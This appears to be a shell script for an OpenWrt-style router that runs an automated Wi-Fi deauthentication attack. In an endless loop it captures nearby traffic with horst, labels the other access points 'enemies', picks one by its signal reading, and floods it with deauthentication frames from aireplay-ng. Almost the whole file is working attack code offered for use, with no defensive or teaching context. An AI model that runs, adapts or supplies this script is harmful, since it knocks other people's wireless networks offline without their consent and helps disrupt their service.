#!/bin/sh
# ****************************************************************
# $Header:$
#
# ****************************************************************
#
# $Log:$

############### constants ###########
ap_interface="wlan0"
phy_interface="phy0"
managed_interface="m_wlan0"
monitor_interface="mon0"
script_name=$(basename $0) # need to be same as file

######## counters ######
number_deauthenticate_packets=100
seconds_monitor=20
_log_file_size=10 #kB

######## files #########
wifi_conf_file="/etc/config/wireless"
horst_output="/tmp/$(basename $0).$$.horst.csv.tmp"
log_file="/tmp/ww.log"
null="/dev/null"

#***** general functions ******

min () {
    # find minimum from $@
    local temp_min=$1
    for i in $@ ; do
        if [ "$temp_min" -lt "$i" ] ; then
            break
        else
            temp_min=$i
        fi
    done
    echo $temp_min
    }

logging () {
    # simple logging
    # $@ expansion occurs within double quotes, it expands to a single word
    # log rotation
    if [ -e "$log_file" ] ; then
        local log_file_size=$(du $log_file | awk '{print $1}')
        if [ "$log_file_size" -gt "$_log_file_size" ] ; then
            rm $log_file
            echo "`date +%Y-%m-%d_%H:%M` -- log file rotation" >> $log_file
        fi
    fi
    local message=$*
    echo "`date +%Y-%m-%d_%H:%M` -- $message" >> $log_file
    }

check_script_is_running () {
    # check is current script is already running
#    if pidof $(basename $0)  >/dev/null ; then
    for pid in $(pidof $(basename $0)) ; do
        if [ "$pid" -ne "$$" ] ; then
            logging "script already running pid= $pid"
            exit 101
        fi
    done
    logging "---- start working pid= $$ -----"
    }

#****** functions **********

disable_AP () {
    { rm $wifi_conf_file && \
        awk '{gsub("option disabled 0", "option disabled 1", $0); print}' \
        > $wifi_conf_file; } < $wifi_conf_file
    wifi
    #awk '{ gsub(/option disabled 0/,"option disabled 1"); print $0 }'\
    #${wifi_conf_file} > ${temp_file}
    }

enable_AP () {
    { rm $wifi_conf_file && \
        awk '{gsub("option disabled 1", "option disabled 0", $0); print}' \
        > $wifi_conf_file; } < $wifi_conf_file
    wifi
    }

create_managed () {
    iw phy $phy_interface interface add $managed_interface type managed
    ifconfig $managed_interface up
    }

create_monitor () {
    iw phy $phy_interface interface add $monitor_interface type monitor
    ifconfig $monitor_interface up
    }

deauthenticate () {
    # $1 - channel
    # $2 - BSSID
    # $3 - client (optionl)
    iw dev $managed_interface set channel $1
    logging ">>> start deauthenticate BSSID $2 on $1 channel"
    aireplay-ng -0 $number_deauthenticate_packets -a $2 $managed_interface
    logging "==== stop deauthenticate BSSID $2 on $1 channel \
        $number_deauthenticate_packets transmited"
    }

get_horst_data () {
    # $1 - seconds number to monitor
    iw dev | grep $monitor_interface > $null || create_monitor
    horst -o $horst_output  -q -i $monitor_interface > $null & \
        sleep $1; kill $!
    }

analyze_horst () {
    # return target for attac
    ap_interface_mac=$(ifconfig $ap_interface | awk '/HWaddr/ {print $5}')
    local enemies=$(grep -v $ap_interface_mac $horst_output | \
        awk  -F, '/^QDATA/ {print $4}')
if [ -n "$enemies" ] ; then

    local enemies_signal=$(grep -v $ap_interface_mac $horst_output | \
        awk  -F, '/^QDATA/ {print $6}')

<<COMMENT1
    # remove dublicates from enemies and put in targets
    targets=''
    for enemy in $enemies ; do
        for target in $targets ; do
            if [ "$target" == "$enemy" ] ; then
                local temp_loop_var=""
                break
            else
                local temp_loop_var=$enemy
            fi
        done
        targets=$target" "$temp_loop_var
    done
COMMENT1
    local enemies_signal_min=$(min $enemies_signal)
    local target_id=1
    for i in $enemies_signal ; do
        if [ "$enemies_signal_min" != "$i" ] ; then
            target_id=$(($target_id+1))
        else
            break
        fi
    done
    local target=$(echo $enemies | awk -v target_id_awk=$target_id \
        '{ print $target_id_awk}')
    echo $target
    return 0
else
    logging "no enemies"
    echo "0"
    return 1
fi
rm $horst_output
    }

deauthenticate_mon () {
    local target=$(analyze_horst)
    if [ "$target" != "0" ] ; then
        logging "target-> $target"
        logging "number_deauthenticate_packets=> $number_deauthenticate_packets"
        logging "monitor_interface=> $monitor_interface"
        aireplay-ng -0 $number_deauthenticate_packets -a \
            $target --ignore-negative-one $monitor_interface > $null
        # return exit code aireplay-ng
        logging "aireplay-ng exit = $?"
    fi
    }


#########################
# main block
#########################

check_script_is_running

while true ; do
#    logging "start"
    get_horst_data $seconds_monitor
    deauthenticate_mon
#    logging "stop"
done




